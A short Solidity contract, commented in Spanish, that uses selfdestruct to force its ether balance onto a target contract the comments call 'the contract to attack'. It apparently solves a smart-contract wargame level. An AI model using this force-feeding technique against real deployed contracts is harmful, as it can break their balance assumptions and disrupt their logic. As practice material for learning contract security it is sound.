// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Voltorb {
    constructor () payable {
        require(msg.value > 0);
    }

    function verBalance() public view returns (uint256){ //Si usamos remix, con este método podemos ver más fácilmente el balance del contrato.
        return address(this).balance;
    }

    function explosion(address payable contractAddress) public payable { //Esta función recibe como parámetro el address del contrato a atacar.
        selfdestruct(contractAddress);
    }
}